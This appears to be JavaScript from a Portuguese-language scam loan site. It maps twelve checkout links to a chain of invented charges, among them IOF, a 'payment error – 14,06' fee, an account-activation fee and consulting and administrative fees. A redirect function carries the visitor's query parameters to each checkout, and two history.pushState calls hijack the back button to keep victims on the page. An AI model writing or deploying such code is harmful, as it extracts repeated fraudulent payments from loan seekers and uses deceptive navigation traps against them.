const baseLinks = {
    up1: "https://www.pagamentos-seguro.link/checkout/58cca84e-9156-4d10-b3f3-3b3422e7ec61", // IOF
    up2: "https://www.pagamentos-seguro.link/checkout/913e70f7-fb05-4067-bd9c-fe8f15f87108", // Taxa de verificação de IOF
    up3: "https://www.pagamentos-seguro.link/checkout/39cab08b-47df-4010-a6bd-cd52083caa08", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://www.pagamentos-seguro.link/checkout/da2c431f-21c6-4512-b63d-e49d08431089", // NFe
    up5: "https://www.pagamentos-seguro.link/checkout/8c64f567-a8c8-4c94-9f35-575be9cb97b1", // Ativar conta
    up6: "https://www.pagamentos-seguro.link/checkout/21b89856-36ec-4651-b263-ee629845f33e", // Taxa de registro do contrato
    up7: "https://www.pagamentos-seguro.link/checkout/e11b9708-2f18-496f-af5a-36ec1f7b2b39", // Parabéns, 20k adicional
    up8: "https://www.pagamentos-seguro.link/checkout/ee9af0ae-802a-4757-8888-b4a58d575a9c", // Erro no pagamento - 14,06
    up9: "https://www.pagamentos-seguro.link/checkout/d4e19ec7-fbad-4567-a826-51898d6fcee0", // APP - 11,99
    up10:"https://www.pagamentos-seguro.link/checkout/cfb06323-7339-4be1-9859-1a5833df30da", // Taxa de Abertura TAC - 16,92
    up11:"https://www.pagamentos-seguro.link/checkout/82f7821a-d1f3-4ef9-9d08-3e2f2e6e08aa", // Taxa de Consultoria Financeira - 19,53
    up12:"https://www.pagamentos-seguro.link/checkout/5da3fb6c-39b9-4ffa-8437-c46002c655a1" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);


